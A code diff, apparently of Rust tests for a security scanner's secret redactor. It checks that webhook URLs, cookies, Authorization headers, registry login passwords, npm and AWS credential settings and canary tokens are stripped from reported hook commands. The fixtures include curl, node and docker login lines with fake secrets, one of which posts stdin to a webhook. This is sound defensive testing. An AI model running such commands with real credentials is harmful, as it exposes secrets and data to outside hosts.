+            "tool -t",
+        ),
+        (
+            "uQiRzpo4DXghDmr9QzzfQu27cmVRsG",
+            "pushover --user uQiRzpo4DXghDmr9QzzfQu27cmVRsG --app azGDORePK8gMaC0QOYAMyEEuzJnyUi",
+            "pushover --user",
+        ),
+        (
+            "azGDORePK8gMaC0QOYAMyEEuzJnyUi",
+            "pushover --user uQiRzpo4DXghDmr9QzzfQu27cmVRsG --app azGDORePK8gMaC0QOYAMyEEuzJnyUi",
+            "--app",
+        ),
+        (
+            "WEBHOOKPATH",
+            "notify --webhook https://example.com/hook/WEBHOOKPATH",
+            "https://example.com/",
+        ),
+        (
+            "k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe",
+            "curl https://example.com/hook/k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe -d @-",
+            "https://example.com/hook/",
+        ),
     ] {
         let out = cmd(raw);
         assert!(!out.contains(canary), "{raw:?} -> {out:?}");
@@ -677,9 +944,15 @@ fn command_text_redacts_webhooks_cookies_flags_and_key_words() {
     }
     // Exec form: one element per line. An unquoted Cookie value runs to its line's end.
     let out = cmd("curl\n-H\nCookie: a=1; sid=EXECCOOKIE\nhttps://app.internal");
-    assert!(!out.contains("EXECCOOKIE") && out.ends_with("\nhttps://app.internal"), "{out:?}");
+    assert!(
+        !out.contains("EXECCOOKIE") && out.ends_with("\nhttps://app.internal"),
+        "{out:?}"
+    );
     // The global redactor (every surface) drops the webhook and cookie shapes too.
-    for raw in ["https://hooks.slack.com/services/T0/B0/GLOBALSLACK", "-H 'Cookie: sid=GLOBALCOOKIE'"] {
+    for raw in [
+        "https://hooks.slack.com/services/T0/B0/GLOBALSLACK",
+        "-H 'Cookie: sid=GLOBALCOOKIE'",
+    ] {
         assert!(!redact(raw).contains("GLOBAL"), "{raw:?} -> {:?}", redact(raw));
     }
     for benign in [
@@ -704,7 +977,11 @@ fn hook_webhook_cookie_and_flag_canaries_reach_no_output() {
     let home = fs::canonicalize(&home).unwrap();
     let proj = home.join("proj");
     fs::create_dir_all(proj.join(".claude")).unwrap();
-    fs::write(home.join(".claude.json"), format!(r#"{{"projects":{{"{}":{{}}}}}}"#, proj.display())).unwrap();
+    fs::write(
+        home.join(".claude.json"),
+        format!(r#"{{"projects":{{"{}":{{}}}}}}"#, proj.display()),
+    )
+    .unwrap();
     let settings = serde_json::json!({"hooks": {
         "Stop": [{"hooks": [
             {"type": "command", "command": "curl", "args": ["-X", "POST", "https://hooks.slack.com/services/T0/B0/Zq8vK3mN7pR2tW9xY4bC6dFg"]},
@@ -753,7 +1030,15 @@ fn hook_webhook_cookie_and_flag_canaries_reach_no_output() {
         let leaked: Vec<&str> = canaries.iter().copied().filter(|c| text.contains(c)).collect();
         assert!(leaked.is_empty(), "{format}: {leaked:?}");
         if format == "json" {
-            for shown in ["hooks.slack.com", "discord.com", "api.telegram.org", "app.internal", "pushover", "example.com", "srv"] {
+            for shown in [
+                "hooks.slack.com",
+                "discord.com",
+                "api.telegram.org",
+                "app.internal",
+                "pushover",
+                "example.com",
+                "srv",
+            ] {
                 assert!(text.contains(shown), "{shown}: the fixture never reached the report");
             }
         }
@@ -768,24 +1053,76 @@ fn hook_webhook_cookie_and_flag_canaries_reach_no_output() {
 fn code_authorization_and_login_and_config_set_values_are_redacted() {
     use rustmachineguard::scanners::redact_command_text as cmd;
     for (canary, raw, kept) in [
-        ("CODEAUTH1", "node -e \"fetch(url,{headers:{Authorization:'Bearer CODEAUTH1'}})\"", "Authorization:'Bearer "),
-        ("CODEAUTH2", "\"Authorization\": \"Bearer CODEAUTH2\"", "\"Authorization\": \""),
-        ("CODEAUTH3", "python3 -c \"requests.get(u, headers={'Authorization': 'token CODEAUTH3'})\"", "'Authorization': '"),
-        ("CODEAUTH4", "fetch(u,{headers:{'Proxy-Authorization':'Basic CODEAUTH4'}})", "Proxy-Authorization"),
-        ("CODEAUTH5", "fetch(u,{headers:{Authorization:`CODEAUTH5`}})", "Authorization:`"),
-        ("LOGINP", "docker login -p LOGINP -u u registry.internal", "docker login -p "),
-        ("LOGINPW", "podman login --password LOGINPW registry.internal", "--password "),
-        ("LOGINHELM", "helm registry login registry.internal -u u -p LOGINHELM", "helm registry login"),
-        ("LOGINEQ", "docker login --password=LOGINEQ registry.internal", "--password="),
+        (
+            "CODEAUTH1",
+            "node -e \"fetch(url,{headers:{Authorization:'Bearer CODEAUTH1'}})\"",
+            "Authorization:'Bearer ",
+        ),
+        (
+            "CODEAUTH2",
+            "\"Authorization\": \"Bearer CODEAUTH2\"",
+            "\"Authorization\": \"",
+        ),
+        (
+            "CODEAUTH3",
+            "python3 -c \"requests.get(u, headers={'Authorization': 'token CODEAUTH3'})\"",
+            "'Authorization': '",
+        ),
+        (
+            "CODEAUTH4",
+            "fetch(u,{headers:{'Proxy-Authorization':'Basic CODEAUTH4'}})",
+            "Proxy-Authorization",
+        ),
+        (
+            "CODEAUTH5",
+            "fetch(u,{headers:{Authorization:`CODEAUTH5`}})",
+            "Authorization:`",
+        ),
+        (
+            "LOGINP",
+            "docker login -p LOGINP -u u registry.internal",
+            "docker login -p ",
+        ),
+        (
+            "LOGINPW",
+            "podman login --password LOGINPW registry.internal",
+            "--password ",
+        ),
+        (
+            "LOGINHELM",
+            "helm registry login registry.internal -u u -p LOGINHELM",
+            "helm registry login",
+        ),
+        (
+            "LOGINEQ",
+            "docker login --password=LOGINEQ registry.internal",
+            "--password=",
+        ),
         ("BEARERFLAG", "tool --bearer BEARERFLAG", "tool --bearer"),
         ("BEARERFLAG2", "tool --bearer=BEARERFLAG2", "tool --bearer="),
-        ("NPMSET", "npm config set //r.example/:_authToken NPMSET", "//r.example/:_authToken"),
-        ("NPMSETEQ", "npm config set //r.example/:_authToken=NPMSETEQ", "//r.example/:_authToken="),
+        (
+            "NPMSET",
+            "npm config set //r.example/:_authToken NPMSET",
+            "//r.example/:_authToken",
+        ),
+        (
+            "NPMSETEQ",
+            "npm config set //r.example/:_authToken=NPMSETEQ",
+            "//r.example/:_authToken=",
+        ),
         ("YARNSET", "yarn config set npmAuthToken YARNSET", "npmAuthToken"),
         ("PNPMSET", "pnpm config set //r.example/:_password PNPMSET", "_password"),
         ("NPMAUTH", "npm config set //r.example/:_auth NPMAUTH", "_auth"),
-        ("AWSSET", "aws configure set aws_secret_access_key AWSSET --profile dev", "aws_secret_access_key"),
-        ("AWSTOK", "aws configure set aws_session_token AWSTOK", "aws_session_token"),
+        (
+            "AWSSET",
+            "aws configure set aws_secret_access_key AWSSET --profile dev",
+            "aws_secret_access_key",
+        ),
+        (
+            "AWSTOK",
+            "aws configure set aws_session_token AWSTOK",
+            "aws_session_token",
+        ),
     ] {
         let out = cmd(raw);
         assert!(!out.contains(canary), "{raw:?} -> {out:?}");
@@ -816,7 +1153,11 @@ fn round4_redactor_canaries_reach_no_output() {
     let home = fs::canonicalize(&home).unwrap();
     let proj = home.join("proj");
     fs::create_dir_all(proj.join(".claude")).unwrap();
-    fs::write(home.join(".claude.json"), format!(r#"{{"projects":{{"{}":{{}}}}}}"#, proj.display())).unwrap();
+    fs::write(
+        home.join(".claude.json"),
+        format!(r#"{{"projects":{{"{}":{{}}}}}}"#, proj.display()),
+    )
+    .unwrap();
     let settings = serde_json::json!({"hooks": {
         "Stop": [{"hooks": [
             {"type": "command", "command": "node", "args": ["-e", "fetch('https://x',{headers:{Authorization:'Bearer CANARYB15'}})"]},
@@ -843,15 +1184,32 @@ fn round4_redactor_canaries_reach_no_output() {
         String::from_utf8_lossy(&out.stdout).to_string()
     };
     let canaries = [
-        "CANARYB15", "CANARYB16", "CANARYA6", "CANARYA14", "CANARYA15", "CANARYA24", "CANARYC3x", "CANARYC6x",
-        "Summer2024!C8", "Summer2024C9", "CANARYC11", "C12Hunter", "PROMPTSEC10CANARY",
+        "CANARYB15",
+        "CANARYB16",
+        "CANARYA6",
+        "CANARYA14",
+        "CANARYA15",
+        "CANARYA24",
+        "CANARYC3x",
+        "CANARYC6x",
+        "Summer2024!C8",
+        "Summer2024C9",
+        "CANARYC11",
+        "C12Hunter",
+        "PROMPTSEC10CANARY",
     ];
     for format in ["terminal", "json", "html", "blueprint"] {
         let text = run(format);
         let leaked: Vec<&str> = canaries.iter().copied().filter(|c| text.contains(c)).collect();
         assert!(leaked.is_empty(), "{format}: {leaked:?}");
         if format == "json" {
-            for shown in ["docker login", "_authToken", "aws_secret_access_key", "--bearer", "Authorization"] {
+            for shown in [
+                "docker login",
+                "_authToken",
+                "aws_secret_access_key",
+                "--bearer",
+                "Authorization",
+            ] {
                 assert!(text.contains(shown), "{shown}: the fixture never reached the report");
             }
         }
